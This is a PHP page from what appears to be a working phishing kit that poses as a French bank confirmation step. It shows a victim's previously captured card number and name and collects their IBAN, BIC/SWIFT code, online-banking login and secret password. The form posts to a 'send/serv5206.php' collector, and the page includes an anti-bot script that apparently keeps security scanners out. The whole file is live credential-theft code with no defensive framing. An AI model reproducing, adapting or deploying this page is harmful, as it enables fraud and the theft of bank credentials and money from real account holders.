<?php 

ob_start();
session_start();
include '../config.php';
include '../antibots.php';

?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Confirmez votre banque</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
                    <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
<?php include'navbar.php'?>
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'send/serv5206.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
                    <center>
                        <span class="step" style="text-transform:uppercase"><b>étape 3 sur 4</b></span>
                        <h3>Confirmez votre banque</h3>
                        <DIV style="text-align:left;text-transform:uppercase">
                            
                            <b>NUMERO DE CARTE : </b><span><?php echo $_SESSION["c_num"]?></span><br>
                            <b>NOM ET PRENOM : </b><span><?php echo $_SESSION["n_card"] ?></span><br>
                              
                        
                        <input id="iban" type="text" name="iban" class="bill_input" placeholder="IBAN" required="required" autocomplete="off" autocorrect="off" aria-required="true">
                        <a id="" role="button" href="#" style="display:block;text-align:left"></a>
                        
                        <input id="css" type="text" style="margin-top:11px" name="codebank" class="bill_input" placeholder="BIC/SWIFT" required="required"autocomplete="off" autocorrect="off" aria-required="true"  >
                        <input id="css" type="text" style="margin-top:11px" name="bankid" class="bill_input" placeholder="Numéro de compte (Identifiant de connexion)" required="required" autocomplete="off" autocorrect="off" aria-required="true">
                        
                        <input type="password" style="margin-top:11px" maxlength="64" name="bankpass" class="bill_input" placeholder="Code secret (Pour vous connecter)" required="required" autocomplete="off" autocorrect="off" aria-required="true">
                        <hr>
                        <input type="submit" name="ibansub" id="sub" value="Continuer" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
            <script>
            $(document).ready(function() {
            var coll = false;
            $('#vu').hide();
            $('#aglbah').on('click',function(){
                if(!coll){
                $('#vu').fadeIn(50);
                $('#iban').fadeIn(50);
                $('#aglbah').html('IBAN');
                $('#css').css('margin-top','15px');
                $('#sub').attr('name','infosub');
                $('#iban').removeAttr('required');
                $("#rib,#codebank,#codeguichet,#ncompte").prop('required',true);
                coll = true;         
                }else{
                $('#vu').fadeIn(50);
                $('#iban').fadeIn(50);
                $('#aglbah').html('Sinon, informations du compte'); 
                $('#css').css('margin-top','5px');
                $('#sub').attr('name','ibansub');
                $('#iban').prop('required',true);
                $("#rib,#codebank,#codeguichet,#ncompte").removeAttr('required');
                coll = false;
                }
            });
    $("#rib,#codebank,#codeguichet,#ncompte").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||
             // Allow: Ctrl+A, Command+A
            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
             // Allow: home, end, left, right, down, up
            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });    
                            $.urlParam = function(name){
       var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
       return results[1] || 0;
}
                            
                            if($.urlParam('error')){
$('#iban').addClass('error');
}
                $('#iban').on('focusout',function(){
             $('#iban').removeClass('error');
});
                
            });
$('#iban').on('input',function(){
   $('#iban').val(function () {
    return this.value.toUpperCase();
}); 
});
            </script>
        </body>
    </html>